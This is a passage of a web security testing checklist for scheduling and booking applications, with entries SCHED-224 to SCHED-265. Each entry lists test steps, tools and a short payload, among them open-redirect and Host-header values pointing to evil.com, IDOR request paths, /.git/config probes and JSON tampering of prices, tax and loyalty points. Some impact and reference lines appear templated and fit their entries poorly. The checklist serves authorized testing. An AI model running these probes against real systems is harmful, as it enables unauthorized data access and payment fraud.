## SCHED-224 — Scheduling Multi-Tenant Data Leak
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Query schedule in tenant A 2. Modify query 3. Access tenant B data 4. Cross-tenant breach

**Expected Result:** Schedules should be strictly tenant-scoped

**Payload Example:**

```
Remove tenant_id filter from query
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SCHED-225 — Scheduling API Key Exposure
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Inspect scheduling requests 2. Find API key in URL/headers 3. Extract key 4. API abuse

**Expected Result:** API keys should be server-side

**Payload Example:**

```
API key in JavaScript or URL parameters
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Browser DevTools / Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SCHED-226 — Scheduling Debug Mode Exposure
**Test Category:** Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Access schedule with debug param 2. Enable debug mode 3. View debug info 4. System exposure

**Expected Result:** Debug should be disabled in production

**Payload Example:**

```
?debug=true or ?verbose=1
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Param Discovery

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SCHED-227 — Scheduling Open Redirect
**Test Category:** Open Redirect · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Schedule has redirect 2. Modify redirect URL 3. Redirect to malicious site 4. Phishing

**Expected Result:** Redirects should be validated

**Payload Example:**

```
redirect=https://evil.com/phish
```

**Impact:** Open redirect -&gt; OAuth code/token theft, credible phishing on the trusted origin.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-601; -&gt;[Open Redirect checklist](#/checklist/openredir); PortSwigger; PayloadsAllTheThings

---

## SCHED-228 — Scheduling CSP Bypass
**Test Category:** Security Misconfiguration · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Analyze CSP header 2. Find bypass 3. Execute XSS 4. Data theft

**Expected Result:** CSP should be comprehensive

**Payload Example:**

```
Exploit unsafe-inline or allowed sources
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** CSP Evaluator / Burp Suite

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SCHED-229 — Scheduling Subdomain Takeover
**Test Category:** Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Find scheduling subdomain 2. Check for dangling DNS 3. Takeover subdomain 4. Serve malicious content

**Expected Result:** Subdomains should be properly configured

**Payload Example:**

```
booking.company.com pointing to unclaimed service
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Subjack / Can-I-Take-Over-XYZ

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## SCHED-230 — Scheduling HTTP Request Smuggling
**Test Category:** Request Smuggling · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Test CL.TE/TE.CL 2. Smuggle request 3. Access other users' data 4. Cache poisoning

**Expected Result:** HTTP parsing should be consistent

**Payload Example:**

```
CL.TE or TE.CL payload
```

**Impact:** HTTP request smuggling -&gt; cache poisoning / auth bypass / request hijacking.

**Tools:** Burp Suite HTTP Request Smuggler

**References:** CWE-444; -&gt;[Request Smuggling checklist](#/checklist/smuggling); James Kettle HTTP Desync Attacks

---

## SCHED-231 — Scheduling Cookie Security Issues
**Test Category:** Security Misconfiguration · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Analyze scheduling cookies 2. Check security flags 3. Find vulnerable cookies 4. Session theft

**Expected Result:** Cookies should have security flags

**Payload Example:**

```
Missing Secure/HttpOnly/SameSite flags
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SCHED-232 — Scheduling Missing Security Headers
**Test Category:** Security Misconfiguration · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Analyze response headers 2. Check for missing headers 3. Exploit missing protections 4. Various attacks

**Expected Result:** All security headers should be present

**Payload Example:**

```
Missing X-Frame-Options/CSP/HSTS
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Security Headers Scanner / Burp Suite

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SCHED-233 — Scheduling Host Header Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Modify Host header 2. Check for injection 3. Cache poisoning 4. Email poisoning

**Expected Result:** Host header should be validated

**Payload Example:**

```
Host: evil.com in scheduling request
```

**Impact:** Host-header injection into this flow -&gt; password-reset poisoning / cache poisoning -&gt; account takeover.

**Tools:** Burp Suite / curl

**References:** CWE-644; -&gt;[Host Header Injection checklist](#/checklist/hostheader); James Kettle Practical Web Cache Poisoning

---

## SCHED-234 — Scheduling User Enumeration
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Test provider access 2. Compare responses 3. Enumerate valid providers 4. User list exposure

**Expected Result:** Responses should be consistent

**Payload Example:**

```
Different errors for valid vs invalid providers
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## SCHED-235 — Scheduling Business Hours Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Provider has business hours 2. Book outside hours 3. Bypass restriction 4. Unauthorized booking

**Expected Result:** Business hours should be enforced

**Payload Example:**

```
Book 3 AM appointment when hours are 9-5
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-236 — Scheduling Holiday Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Provider closed on holiday 2. Book on holiday 3. Bypass holiday setting 4. Impossible appointment

**Expected Result:** Holidays should be enforced

**Payload Example:**

```
Book on Christmas when marked closed
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-237 — Scheduling Minimum Notice Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Minimum notice required 2. Book with less notice 3. Bypass minimum 4. Rushed appointment

**Expected Result:** Minimum notice should be enforced

**Payload Example:**

```
Book 5 minutes ahead when 24h required
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-238 — Scheduling Maximum Advance Bypass
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Maximum advance booking 2. Book further ahead 3. Bypass maximum 4. Far future booking

**Expected Result:** Maximum advance should be enforced

**Payload Example:**

```
Book 2 years ahead when max is 30 days
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-239 — Scheduling Service Dependency Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Service B requires Service A 2. Book B without A 3. Bypass dependency 4. Incomplete process

**Expected Result:** Dependencies should be enforced

**Payload Example:**

```
Book follow-up without initial consultation
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-240 — Scheduling Staff Assignment Manipulation
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Booking assigns staff 2. Modify staff_id 3. Assign to different staff 4. Unauthorized assignment

**Expected Result:** Staff assignment should be validated

**Payload Example:**

```
{"staff_id":"preferred_staff"} not in availability
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-241 — Scheduling Location Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Select location 2. Modify location_id 3. Book at unauthorized location 4. Access restricted location

**Expected Result:** Location access should be validated

**Payload Example:**

```
Book at VIP location without permission
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-242 — Scheduling Group Booking Limit Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Group booking has limit 2. Add more participants 3. Exceed limit 4. Overbooking

**Expected Result:** Participant limits should be enforced

**Payload Example:**

```
Add 50 participants when max is 10
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-243 — Scheduling Payment Link Manipulation
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Receive payment link 2. Modify amount 3. Pay less 4. Financial loss

**Expected Result:** Payment links should be signed

**Payload Example:**

```
Modify amount in payment URL
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / URL Analysis

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-244 — Scheduling Deposit Bypass
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Booking requires deposit 2. Skip deposit step 3. Book without deposit 4. Revenue loss

**Expected Result:** Deposit should be required

**Payload Example:**

```
Complete booking without payment step
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-245 — Scheduling Discount Code Abuse
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Apply discount code 2. Use expired/invalid code 3. Get unauthorized discount 4. Revenue loss

**Expected Result:** Discount codes should be validated

**Payload Example:**

```
Use code intended for different service
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-246 — Scheduling Referral Fraud
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Referral system exists 2. Self-refer 3. Get referral bonus 4. Fraudulent rewards

**Expected Result:** Self-referral should be prevented

**Payload Example:**

```
Create booking using own referral code
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Multiple Accounts

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-247 — Scheduling Loyalty Points Manipulation
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Earn loyalty points 2. Modify point count 3. Get extra rewards 4. Fraud

**Expected Result:** Points should be server-calculated

**Payload Example:**

```
{"loyalty_points":999999}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-248 — Scheduling Gift Card Bypass
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Use gift card 2. Modify balance 3. Exceed gift card value 4. Theft

**Expected Result:** Gift card balance should be verified

**Payload Example:**

```
{"gift_card_value":1000} when balance is $50
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-249 — Scheduling Insurance Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Service requires insurance 2. Skip verification 3. Book without insurance 4. Liability issue

**Expected Result:** Insurance should be verified

**Payload Example:**

```
Book medical service without insurance check
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-250 — Scheduling Age Verification Bypass
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Service has age requirement 2. Bypass age check 3. Book underage 4. Legal violation

**Expected Result:** Age should be verified

**Payload Example:**

```
Book age-restricted service with false DOB
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-251 — Scheduling Consent Form Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Booking requires consent 2. Skip consent form 3. Book without consent 4. Legal issue

**Expected Result:** Consent should be mandatory

**Payload Example:**

```
Complete booking without consent step
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-252 — Scheduling Document Upload Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Service requires documents 2. Skip upload 3. Book without documents 4. Incomplete booking

**Expected Result:** Documents should be required

**Payload Example:**

```
Book visa appointment without passport upload
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-253 — Scheduling Pre-requisite Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Service has pre-requisites 2. Bypass check 3. Book without completing pre-reqs 4. Service failure

**Expected Result:** Pre-requisites should be verified

**Payload Example:**

```
Book advanced class without beginner completion
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-254 — Scheduling Currency Manipulation
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. View price in USD 2. Pay in different currency 3. Exploit exchange rate 4. Financial manipulation

**Expected Result:** Currency should be consistent

**Payload Example:**

```
{"currency":"BTC"} for USD service
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-255 — Scheduling Tax Calculation Bypass
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Price includes tax 2. Modify tax amount 3. Pay less tax 4. Tax fraud

**Expected Result:** Tax should be server-calculated

**Payload Example:**

```
{"tax":0} when tax should apply
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-256 — Scheduling Invoice IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Access own invoice 2. Modify invoice_id 3. Access others' invoices 4. Financial data exposure

**Expected Result:** Invoice access should verify ownership

**Payload Example:**

```
GET /api/invoices/victim_invoice_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-257 — Scheduling Receipt Forgery
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Receive receipt 2. Modify receipt content 3. Create fake proof of payment 4. Fraud

**Expected Result:** Receipts should be verifiable

**Payload Example:**

```
Modify receipt PDF content
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** PDF Tools / Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-258 — Scheduling Notification Opt-Out Bypass
**Test Category:** Privacy Violation · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. User opts out of notifications 2. Send anyway 3. Ignore preference 4. Privacy violation

**Expected Result:** Opt-out should be respected

**Payload Example:**

```
Send notifications to opted-out user
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## SCHED-259 — Scheduling Data Retention Bypass
**Test Category:** Privacy Violation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Data has retention period 2. Access after retention 3. View deleted data 4. Privacy breach

**Expected Result:** Retention should be enforced

**Payload Example:**

```
Access booking data past retention period
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / Postman

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## SCHED-260 — Scheduling GDPR Export IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Request data export 2. Modify user_id 3. Export others' data 4. Mass data breach

**Expected Result:** Export should verify identity

**Payload Example:**

```
GET /api/users/victim_id/data-export
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-261 — Scheduling Deletion Request Bypass
**Test Category:** Privacy Violation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Request data deletion 2. Data not deleted 3. Privacy violation 4. Legal issue

**Expected Result:** Deletion should be complete

**Payload Example:**

```
Data still accessible after deletion request
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## SCHED-262 — Scheduling Third-Party Integration Leak
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Integration with third party 2. Excessive data shared 3. Data leaked 4. Privacy violation

**Expected Result:** Only necessary data should be shared

**Payload Example:**

```
Full booking details sent to analytics
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Network Analysis

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SCHED-263 — Scheduling Backup Exposure
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Enumerate backup files 2. Find scheduling backups 3. Download backups 4. Data breach

**Expected Result:** Backups should not be web-accessible

**Payload Example:**

```
/backups/schedules.sql or /schedules.json.bak
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / ffuf / dirsearch

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SCHED-264 — Scheduling Source Code Exposure
**Test Category:** Information Disclosure · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Access scheduling source 2. Find .git or source files 3. Download source 4. Vulnerability discovery

**Expected Result:** Source should not be accessible

**Payload Example:**

```
/.git/config or /scheduler.php.bak
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / GitTools / ffuf

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SCHED-265 — Scheduling Environment Variable Leak
**Test Category:** Information Disclosure · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Trigger scheduling error 2. Error shows env vars 3. Extract secrets 4. System compromise

**Expected Result:** Env vars should never be exposed

**Payload Example:**

```
Database credentials in error message
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Error Analysis

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---
